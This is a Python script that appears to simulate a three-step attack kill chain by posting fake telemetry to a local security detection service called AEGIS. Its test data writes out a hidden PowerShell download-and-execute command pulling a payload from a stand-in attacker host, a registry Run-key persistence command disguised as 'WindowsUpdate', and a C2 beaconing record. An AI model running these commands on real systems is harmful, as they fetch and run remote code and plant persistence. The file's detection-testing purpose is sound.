import os, time, requests, hashlib
from dotenv import load_dotenv
from colorama import Fore, init

init(autoreset=True)
os.environ["no_proxy"] = "*"
os.environ["NO_PROXY"] = "*"

sim_client = requests.Session()
sim_client.trust_env = False
load_dotenv()
AEGIS_SECRET = os.getenv("AEGIS_API_KEY", "UNSET_KEY")

DRIFT_URL = "http://127.0.0.1:8000/drift"
GATEWAY_URL = "http://127.0.0.1:8000/gateway_report"

HEADERS = {
    "x-aegis-key": AEGIS_SECRET,
    "x-aegis-signature": hashlib.sha256(b"AEGIS_CORE_AUTHORIZED_RUNTIME").hexdigest(),
    "Content-Type": "application/json"
}

print(f"{Fore.MAGENTA}--- AEGIS PRO: 3-STEP KILL-CHAIN SIMULATOR ---")
print(f"{Fore.LIGHTBLACK_EX}Simulating a multi-vector attack to trigger the Nexus Master Dossier...\n")

print(f"{Fore.CYAN}[🚀] STEP 1: Initial Access (Dropping Payload via PowerShell)")
payload_1 = [{
    "type": "Process", "eid": 1,
    "data": "powershell.exe -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil-empire.ru/payload.ps1')\"",
    "payload": {
        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "CommandLine": "powershell.exe -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil-empire.ru/payload.ps1')\"",
        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
        "Hash": "NO_HASH_AVAILABLE",
        "ProcessId": "4012"
    }
}]
sim_client.post(DRIFT_URL, json=payload_1, headers=HEADERS)
time.sleep(6) 

print(f"{Fore.CYAN}[🚀] STEP 2: Defense Evasion (Registry Run Key Modification)")
payload_2 = [{
    "type": "Process", "eid": 1,
    "data": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"WindowsUpdate\" /t REG_SZ /d \"C:\\temp\\payload.exe\" /f",
    "payload": {
        "Image": "C:\\Windows\\System32\\reg.exe",
        "CommandLine": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"WindowsUpdate\" /t REG_SZ /d \"C:\\temp\\payload.exe\" /f",
        "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "Hash": "NO_HASH_AVAILABLE",
        "ProcessId": "4055"
    }
}]
sim_client.post(DRIFT_URL, json=payload_2, headers=HEADERS)
time.sleep(6)

print(f"{Fore.CYAN}[🚀] STEP 3: Command & Control (Robotic Network Beaconing)")
payload_3 = {
    "score": 0.98,
    "status_label": "🚨 C2 BEACONING (ROBOTIC TIMING)",
    "reason": "Anomalous robotic polling interval detected from injected process.",
    "peers": ["185.10.68.23"], 
    "destination_port": 443,
    "volume_kb": 12.4,
    "unique_ports": 1,
    "jitter": 0.001
}
sim_client.post(GATEWAY_URL, json=payload_3, headers=HEADERS)

print(f"\n{Fore.GREEN}[+] Kill-chain sequence deployed.")
print(f"{Fore.LIGHTBLACK_EX}Wait ~60 seconds for the Orchestrator's Temporal Window to close and compile the Nexus Dossier.")